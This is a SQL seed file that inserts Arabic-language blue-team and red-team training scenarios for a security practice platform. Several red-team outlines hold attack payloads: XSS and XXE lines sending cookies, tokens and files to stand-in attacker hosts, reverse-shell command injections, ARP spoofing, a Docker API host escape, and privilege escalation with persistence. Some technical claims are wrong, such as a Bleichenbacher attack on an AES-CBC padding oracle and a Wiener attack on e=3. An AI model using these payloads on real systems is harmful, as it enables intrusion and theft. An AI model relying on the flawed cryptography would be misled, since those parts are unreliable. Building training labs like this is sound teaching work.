-- APEX Final Curated Pool — 30 Blue + 30 Red
-- مستوى HackTheBox / PortSwigger / SANS / MITRE ATT&CK
-- شغّل هذا الملف بعد إيقاف backend لتفادي race condition
-- target=30, threshold=20, batch=10

-- ===========================
-- BLUE TEAM
-- ===========================

INSERT INTO public.blue_scenarios (module, difficulty, title, story, task_outline, xp_reward) VALUES
('xss','مبتدئ','سد Stored XSS في NuraTalk','منصة NuraTalk تعرض التعليقات عبر innerHTML. مهاجم حقن وسم script سرق كوكيز 1,200 جلسة.','استبدل innerHTML بـ textContent وDOMPurify.sanitize، وتأكّد أن img onerror لا يُنفَّذ.',100),
('sql-injection','متوسط','تحييد Union-Based SQLi في TechBazaar','موقع TechBazaar يبني product.php?id=$id في SELECT. المهاجم نفّذ UNION SELECT username,password FROM users-- واستخرج 80 ألف حساب.','استخدم Prepared Statements، تحقّق أن id عدد صحيح فقط، طبّق Least Privilege على DB، أضف WAF.',150),
('csrf','متوسط','تأمين API REST في PayWave','بنك PayWave يعرض POST /api/transfer يقبل JSON. لا فحص Origin ولا token.','اشترط X-CSRF-Token custom header، تحقّق من Origin بصرامة، حدّد CORS، وفعّل SameSite=Strict.',150),
('ssrf','متوسط','صد SSRF على AWS IMDSv1 في CloudPDF','CloudPDF تقبل URL. المهاجم سرق IAM keys من 169.254.169.254 و50TB من S3.','حدّث EC2 لـ IMDSv2، احجب 169.254.169.254، طبّق URL allowlist، IAM roles بأدنى صلاحية، فعّل CloudTrail.',150),
('idor','متوسط','سد IDOR في BillHub','بوابة BillHub GET /download/invoice/9001. المهاجم brute-forced 9001-9999 وحصل على فواتير 4 مليون $.','أضف فحص ملكية user_id، استبدل بـ UUID v4، فعّل audit log.',150),
('lfi-rfi','متوسط','صد LFI عبر Log Poisoning في Apache','WebX يستدعي include($_GET[lang]). المهاجم حقن PHP في User-Agent ثم include(/var/log/apache2/access.log).','عطّل allow_url_include، نسّق الـ UA في الـ log، استخدم open_basedir وrealpath() وwhitelist.',150),
('xxe','متوسط','سد XXE في SOAP TravelGate','TravelGate للحجوزات يستقبل XML. المهاجم أضاف ENTITY xxe SYSTEM file:///etc/passwd وسرّب 3,500 عميل.','عطّل معالجة DTDs، انقل لـ JSON، وإن لزم XML طبّق XSD whitelist صارم.',150),
('command-injection','متوسط','سد Command Injection في NetAdmin','NetAdmin يستدعي system(ping -c 4 .$_GET[host]). المهاجم أرسل 8.8.8.8;cat /etc/shadow.','استبدل system() بـ subprocess.run([ping,-c,4,host])، تحقّق بـ regex IPv4/IPv6، ألغِ shell=True.',150),
('packet-analysis','متوسط','كشف DNS Tunneling في AlphaNet','SOC لاحظت حركة DNS غير اعتيادية: طلبات TXT طويلة لـ 1200 نطاق يومياً. المهاجم يُسرب عبر dnscat2.','حلل pcap بـ tshark، استخرج dnscat2 channel، اعمل block DGA عبر RPZ، أضف IDS rule لـ TXT > 200 byte.',150),
('firewall','متوسط','سد قواعد Firewall مكسورة في DataHub','iptables في DataHub تسمح بـ ACCEPT all from 10.0.0.0/8. المهاجم وصل للإنتاج كاملة.','احذف rule العامة، طبّق allowlist، افصل DMZ عن Production VLAN، استخدم nftables مع conntrack.',150),
('scanning','متوسط','كشف Stealth Scan في SenseGuard','SenseGuard لاحظت 3,200 حزمة SYN متفرقة. المهاجم ينفّذ idle scan عبر zombie host.','فعّل Suricata rule لـ anomalic channel، طبّق threshold على SYN rate، أضف honeypot، صدّر لـ SIEM.',150),
('mitm','متوسط','صد ARP Poisoning على LAN في TechCorp','TechCorp لاحظت انقطاعاً. المهاجم ضخ ARP replies مزورة فأصبح MITM.','فعّل Dynamic ARP Inspection، DHCP Snooping، علّم HTTPS-Only، استخدم 802.1X.',150),
('dns-poisoning','متوسط','احتواء DNS Spoofing على MikroTik','اكتشف فريق IT أن 8,000 عميل يوجّهون لـ IP مزيف عند زيارة bank.com. MikroTik أصيب عبر winbox.','حدّث firmware، فعّل allow-list لخدمات winbox، غيّر كلمات سر admin، فعّل DNSSEC، راقب /ip dns static.',150),
('encryption-basics','متوسط','كسر Vigenere في CipherVault','CipherVault يخزن بيانات بـ Vigenere 6-char key ثابت.','استخدم Kasiski examination، Index of Coincidence، Friedman test، استخرج plaintext.',150),
('hash-cracking','متوسط','كسر NTLM من NTDS.dit','في اختراق AD، استخرج المهاجم NTDS.dit و12,000 NTLM hash.','استخرج عبر secretsdump، احفظ hashcat -m 1000، شغّل hashcat -a 3 مع rockyou.txt + rules/best64.',150),
('rsa-aes','قوي','صد Padding Oracle في VoteSecure','VoteSecure يستخدم AES-CBC ويكشف خطأ PKCS#7 padding عبر HTTP 400 vs 500. المهاجم فكّ تشفير تصويت خلال 30 دقيقة.','وحّد رسائل الخطأ، استخدم AES-GCM، طبّق HMAC على ciphertext (encrypt-then-MAC)، rate limit.',200),
('steganography','متوسط','استخراج LSB من PNG لـ StegoCorp','موظف سابق سرب company-logo.png تشك SOC أنها تحوي تسريبات LSB.','stegsolve أو zsteg --all لتحليل bit planes، steghide للاستخراج، حلّل entropy وقارن planes.',150),
('binary-analysis','قوي','تحليل Ransomware MalwareX','عينة Ransomware ضربت 3 مستشفيات. مطلوب تفكيك packer واستخراج C2 وwallet.','REMnux/FlareVM، PEiD للـ packer، upx -d، حلّل السلوك في Cuckoo، استخرج strings من .rdata.',200),
('assembly-cracking','قوي','كسر License في SecureGuard Pro','SecureGuard Pro يقبل serial 25 char. مطلوب فهم الخوارزمية وتوليد مفاتيح صحيحة.','حلّل بـ Ghidra/IDA، حدد function التحقق، اتبع المنطق (XOR/rotations/checksums)، طوّر keygen.',200),
('linux-privesc','متوسط','تصعيد عبر SUID /usr/bin/find','في اختبار اختراق، حصلت على shell www-data. /usr/bin/find يملك SUID bit.','find . -exec /bin/sh -p -quit، اجمع /etc/shadow، استخرج SSH keys لـ root، اصنع persistence.',150),
('windows-privesc','متوسط','تصعيد عبر Unquoted Service Path','خدمية Veeam Backup تستخدم C:\Program Files\Veeam\Backup\Veeam.exe بدون quotes.','أنشئ C:\Program.exe كـ reverse shell، sc stop/start الخدمة، احصل على SYSTEM، نظّف artifact.',150),
('active-directory','قوي','كشف Kerberoasting في MegaCorp','SOC لاحظت طلبات TGS متكررة لـ SPNs. المهاجم يستخرج tickets لـ offline cracking.','مراقبة Event ID 4769 مع Ticket Encryption 0x17 RC4، hashcat -m 13100، طبّق Managed Service Accounts + AES.',200),
('android-ios','متوسط','سد Insecure Storage في FinanceApp','FinanceApp يخزن tokens في SharedPreferences بـ MODE_WORLD_READABLE. استخرج access tokens لـ 50,000 مستخدم.','انقل لـ EncryptedSharedPreferences مع Keystore، طبّق SafetyNet، فعّل FLAG_SECURE، tokens قصيرة العمر.',150),
('cloud-config','متوسط','سد S3 Bucket Public في CloudFlow','باحث أمني اكتشف s3://cloudflow-prod-data مفتوح للعالم مع PII لـ 2 مليون عميل.','فعّل Block Public Access، bucket policies بـ least privilege، SSE-KMS، Macie، CloudTrail data events.',150),
('log-analysis','متوسط','كشف Webshell في Apache access.log','access.log يحوي POST لـ /uploads/avatar.php بمدخلات Base64 طويلة. المهاجم رفع webshell.','grep -E POST.*avatar.php access.log، حلّل user-agents المكررة، أزل webshell، طبّق disable_functions.',150),
('memory-forensics','قوي','استخراج Mimikatz من Memory Dump','في تحقيق جنائي، تم التقاط memory.dmp من جهاز اخترق.','Volatility 3: pslist لـ mimikatz، sekurlsa::logonpasswords، malfind، netscan، hashdump لـ SAM.',200),
('xss','قوي','صد Blind XSS عبر SVG في FinShield','موظفو FinShield أبلغوا أن متصفحاتهم تنفّذ كوداً خبيثاً فور فتح تذاكر الدعم. المهاجم رفع svg onload=fetch(//exfil/?c=+document.cookie).','أضف sanitization server+client، HttpOnly+Secure+SameSite=Strict، CSP script-src self nonce، WAF rule.',200),
('sql-injection','قوي','احتواء Second-Order SQLi في EnergyGrid','بوابة EnergyGrid: المهاجم سجّل اسماً يحوي DROP TABLE invoices;-- وعند توليد التقرير نُفِّذ، ففُقد 3 ملايين سجل.','استخدم Prepared Statements عند الإدخال والقراءة، escape output حسب السياق، أضف integrity hash، DB firewall.',200),
('ssrf','قوي','صد SSRF DNS Rebinding في KubeFlow','KubeFlow يقبل URL صورة. المهاجم سجّل evil.attacker.com يعود لـ 10.96.0.1 (kube-apiserver) وسرق tokens.','حلّل اسم المضيف مرة واحدة وقارن IP، احجب service CIDR و169.254.169.254، أضف NetworkPolicy.',200),
('mitm','قوي','كشف SSL Strip على HotelNet-WiFi-FREE','خلال اختبار، نُشرت WiFi وهمية. المهاجم هبط TLS إلى HTTP لـ 47 نزيل خلال ساعتين.','حلّل pcap بـ tshark http.request، ابحث عن 301 redirect https→http، حدد BSSID rogue AP، HSTS preload.',200),
('hash-cracking','قوي','كسر Bcrypt مسرّب من AuthFlow','سُرّبت قاعدة بيانات بحجم 800K bcrypt cost=10. مطلوب تقييم قابلية الكسر.','استخرج hashes $2b$10$، شغّل hashcat -m 3200 مع rockyou.txt، أضف rules/best64 و dive، وثّق cost analysis.',200);

-- ===========================
-- RED TEAM
-- ===========================

INSERT INTO public.red_scenarios (module, difficulty, title, story, task_outline, xp_reward) VALUES
('xss','مبتدئ','سرقة Cookie عبر Stored XSS في NuraTalk','منصة NuraTalk لا تنقّي مدخلات حقل التعليقات. تريد سرقة كوكيز جلسة مشرف.','سجّل تعليق يحوي <img src=x onerror=fetch(//attacker/?c=+document.cookie)>، استقبل الكوكيز في sandbox، سجّل دخول بها.',100),
('sql-injection','مبتدئ','تخطي تسجيل دخول ShopMart','ShopMart يبني SELECT * FROM users WHERE email=$e AND pwd=$p بالـ concatenation. تريد الدخول كأدمن.','أرسل email: admin@shop.com-- - وأي pwd، أو استخدم OR 1=1--. وثّق الاستعلام الناتج واسم المستخدم.',100),
('csrf','متوسط','تزوير طلب تحويل في PayWave','PayWave يعرض /api/transfer يقبل JSON ولا يتحقق من Origin. تريد تحويل 500$ من حساب عميل لحسابك.','أنشئ form بـ enctype=text/plain يرسل {"to":"attacker","amount":"500"} مع credentials، قدّم البرهان.',150),
('ssrf','متوسط','استخراج IAM Credentials من CloudPDF','CloudPDF تقبل URL. EC2 يستخدم IMDSv1. تريد سحب IAM keys لـ S3 bucket حساس.','أنشئ URL=http://169.254.169.254/latest/meta-data/iam/security-credentials/، استخرج AccessKey و SecretKey، ثم aws s3 cp.',150),
('idor','مبتدئ','استخراج بيانات مستخدمين من Taskly','Taskly يستخدم /api/users/{id}/profile بدون فحص ملكية. تريد تعداد المستخدمين.','سجّل حساب، التقط GET /api/users/1/profile حتى /50. استخرج email و phone و name.',100),
('lfi-rfi','مبتدئ','قراءة /etc/passwd من DocuLib','DocuLib يستدعي include($_GET[page]). تريد قراءة ملفات النظام.','جرّب ?page=../../../../etc/passwd ثم ?page=php://filter/convert.base64-encode/resource=index.php. سجّل النتائج.',100),
('xxe','متوسط','Blind XXE OOB في LogIngest','LogIngest يحلّل XML لكن لا يعرضه. تريد exfiltrate /etc/hostname عبر قناة خارجية.','أنشئ XML payload مع parameter entity يشير لـ http://your-server.com/?d=file:///etc/hostname، استقبل في netcat.',150),
('command-injection','متوسط','RCE عبر ImageMagick في ImageProc','ImageProc يستخدم exec(convert .$file. output.png) لرفع الصور. تريد تنفيذ أوامر كـ www-data.','ارفع ملف باسم |id;.png أو $(id).png، أنشئ reverse shell عبر perl/python one-liner.',150),
('packet-analysis','متوسط','تحديد C2 Beacon لـ Cobalt Strike','التقطت 800MB pcap يشمل beacon. تريد تأكيد C2 وتحديد teamserver.','tshark tls.handshake.extensions_server_name لتحديد destinations، استخرج JA3/JA3s fingerprint، حلّل inter-arrival time.',150),
('firewall','متوسط','اكتشاف منفذ مخفي في DataHub','DataHub يحجب 22, 80, 443 لكن المهاجم وجد 8080 مفتوحاً. تريد رسم المنافذ الخفية.','nmap -sS -p 1-65535 --open --min-rate 5000، ركّز على bypass ports (53, 80, 443, 8080, 8443).',150),
('scanning','متوسط','SYN Stealth Scan لـ SenseGuard','تخطّط بنية SenseGuard بدون تنبيه IDS. تستخدم nmap SYN scan.','nmap -sS -T2 --source-port 53 -D RND:10 --randomize-hosts -p 1-1000 target، أضف -f.',150),
('mitm','متوسط','ARP Spoofing + SSL Strip على TechCorp','تريد اعتراض HTTP traffic من زميل. تستخدم arpspoof + sslstrip.','echo 1 > /proc/sys/net/ipv4/ip_forward ثم arpspoof -i eth0 -t victim -r gateway، بعدها sslstrip -l 8080 + iptables redirect.',150),
('dns-poisoning','متوسط','PoC لـ DNS Cache Poisoning','في بيئة معزولة، تريد إثبات أن DNS resolver قابل لـ cache poisoning.','scapy لإرسال DNS response مزورة بسرعة لـ victim query، حدد source port صحيح و TXID، وثّق كم محاولة.',150),
('encryption-basics','متوسط','كسر Vigenere Custom في CipherVault','CipherVault يخزن بيانات بـ Vigenere 6-char key. تريد استخراج النص الأصلي.','اجمع ciphertext كافي، Kasiski للبحث عن repeats بمسافة 3-12، حدد key length، حلّل frequency لكل موضع.',150),
('hash-cracking','متوسط','كسر MD5 hashes من WordPress','كلمات مرور WordPress مسرّبة MD5 غير salted. تريد كسر أكبر عدد خلال 6 ساعات.','hashcat -m 0 -a 0 hashes.txt rockyou.txt، أضف rules/best64، أوقف بعد الوصول لقمة، وثّق success rate.',150),
('rsa-aes','قوي','Bleichenbacher Padding Oracle على VoteSecure','VoteSecure يكشف PKCS#7 padding errors. تريد فك تشفير تصويت خلال 30 دقيقة.','حدد الـ oracle (400 vs 500)، نفّذ Bleichenbacher attack مع c = c * s^e mod n، استخرج النص بعد ~10000 محاولة.',200),
('steganography','متوسط','استخراج نص من audio spectrogram','تسريب صوتي يحوي spectrogram مشبوه. تريد استخراج الـ flag.','Audacity أو Sonic Visualiser، Spectrogram view، ابحث عن أنماط في frequencies >15kHz.',150),
('binary-analysis','قوي','فك UPX على MalwareX ransomware','MalwareX معبأة بـ UPX. تريد استخراج الـ payload الأصلي بدون تشغيل في prod.','strings | grep UPX، upx -d malware.bin، حلّل بـ Ghidra، شغّل في Cuckoo sandbox مع FakeNet.',200),
('assembly-cracking','قوي','Patch Binary لتجاوز License في SecureGuard','SecureGuard Pro يتحقق من license محلياً. تريد نسخة تعمل بدون key.','افتح بـ Ghidra، حدّد function license_ok flag (cmp + jne)، عدّل jne -> jmp أو NOP، احفظ.',200),
('linux-privesc','متوسط','استغلال SUID /usr/bin/bash','خادم اخترقته يحوي SUID /usr/bin/bash. تريد تصعيد root.','bash -p (SUID يحفظ effective UID)، تحقّق من id، اقرأ /etc/shadow، اصنع persistence في /etc/cron.d.',150),
('windows-privesc','متوسط','JuicyPotato على Windows Server 2016','لديك session كـ IIS AppPool. تريد SYSTEM عبر DCOM/RPC exploit.','JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {8BC3F06E-3FAB-4FFE-9F01-E4B8B8CE9A8A}، احصل على SYSTEM shell.',150),
('active-directory','قوي','Kerberoast SPN account في MegaCorp','لديك domain user low-priv. تريد تصعيد الصلاحيات عبر Kerberoasting.','GetUserSPNs.py -dc-ip <DC> <domain>/<user>:<pass> -request، crack عبر hashcat -m 13100.',200),
('android-ios','متوسط','تخطي Certificate Pinning في FinanceApp','FinanceApp على Android يفرض SSL pinning. تريد اعتراض traffic الـ API.','objection لاستبدال TrustManager، أو Burp + BurpCert، أو apk-mitm لتعديل APK وإزالة pin.',150),
('cloud-config','متوسط','استغلال Docker API على Server-01','Server-01 يشغّل Docker daemon على :2375 بدون TLS. تريد اختراق host.','curl http://target:2375/version، بعدها docker -H tcp://target:2375 run -v /:/host -it alpine chroot /host /bin/sh.',150),
('log-analysis','متوسط','تحديد المهاجم الأولي في access.log','في اختراق WebHost، تريد تحديد الـ IP الأولي الذي حقن webshell.','grep -E "POST.*\.php" access.log | awk، حدد الـ IP الأكثر غرابة، استخرج user-agent و time window.',150),
('memory-forensics','قوي','استخراج LSASS من memory.dmp','في تحقيق جنائي، حصلت على memory.dmp. تريد credentials المستخدمين.','Volatility 3: pslist --pid 956، dd of lsass.dmp، mimikatz::sekurlsa::minidump، استخرج plaintext + NTLM.',200),
('sql-injection','قوي','Time-Based Blind SQLi في MediCore','API MediCore يعرض 200/404. تريد استخراج admin password حرف بحرف.','AND IF(ASCII(SUBSTRING(...))=97,SLEEP(5),0)، سكريبت Python يختبر ASCII 32-126 لكل موضع، وثّق وقت التنفيذ.',200),
('xss','قوي','DOM XSS عبر location.hash في SmartMail','SmartMail SPA يقرأ location.hash و يضعه في eval() لتنفيذ route.','payload: #javascript:fetch(//attacker/?+localStorage.token)، اعمل phishing link، تسريب token JWT.',200),
('command-injection','قوي','Polyglot Command Injection في ImageProc','ImageProc يطبّق عدة فلاتر. تريد polyglot يعمل في كل الفلترة.','$(rev${IFS}echo${IFS}PYTHON_REV_SHELL)، أو %0aid، أو chained: a];id;[b، أو ${PATH:0:1}etc${PATH:0:1}passwd.',200),
('rsa-aes','متوسط','Wiener Attack على RSA صغير في CryptoChat','CryptoChat يستخدم RSA بمفتاح عام e=3 صغير. تريد المفتاح الخاص.','احصل على n و e من key.pem، Wieners attack عبر continued fraction expansion، استخرج d، فك بـ OAEP.',150);
